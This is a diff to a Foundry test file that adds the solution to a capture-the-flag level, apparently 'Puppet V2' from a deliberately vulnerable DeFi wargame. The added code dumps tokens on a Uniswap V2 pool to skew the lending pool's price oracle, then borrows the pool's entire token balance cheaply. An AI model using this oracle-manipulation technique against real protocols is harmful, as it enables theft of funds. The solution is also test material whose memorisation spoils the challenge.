@@ -97,8 +97,20 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    function swapExactDvtForWeth(uint256 amount) internal {
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(amount, 1, path, player, block.timestamp * 2);
+    }
+
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(lendingPool), type(uint256).max);
+        swapExactDvtForWeth(PLAYER_INITIAL_TOKEN_BALANCE);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
